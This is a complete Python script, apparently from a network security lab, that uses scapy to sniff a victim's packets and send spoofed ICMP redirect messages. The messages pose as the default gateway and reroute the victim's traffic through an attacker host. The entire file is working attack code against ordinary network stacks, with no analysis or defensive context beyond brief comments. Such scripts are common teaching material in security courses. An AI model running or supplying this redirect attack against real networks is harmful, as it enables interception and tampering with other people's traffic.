#!/usr/bin/env python3
from scapy.all import *
import time

# define the IP addresses and network interface
victim_ip = "10.0.2.4"
default_gateway_ip = "10.0.2.1"
attacker_ip = "10.0.2.6"
iface = "enp0s3"  # replace with your network interface name

def send_icmp_redirect(pkt):
    # check if the packet has an IP layer,
    # we only handle packets which have an IP layer.
    if IP in pkt:
        try:
            # craft the ICMP Redirect message
            # the crafted packet contains its own IP header,
            # its own ICMP header, and the original IP packet
            # which we captured.
            icmp_redirect = IP(src=default_gateway_ip, dst=victim_ip) / \
                            ICMP(type=5, code=1, gw=attacker_ip) / \
                            IP(src=pkt[IP].src, dst=pkt[IP].dst) / \
                            pkt[IP].payload

            print(f"Sending ICMP Redirect to {victim_ip}, redirecting traffic for destination {pkt[IP].dst} to {attacker_ip}...")
            send(icmp_redirect)
            print("ICMP Redirect message sent.")
        except Exception as e:
            print(f"Error crafting or sending ICMP redirect: {e}")
    else:
        print("Packet does not contain an IP layer.")

# sniff packets and send ICMP redirects in an infinite loop
print("Starting packet sniffing...")
try:
    sniff(filter="src host {}".format(victim_ip), prn=send_icmp_redirect, iface=iface)
except KeyboardInterrupt:
    print("Stopped by user.")
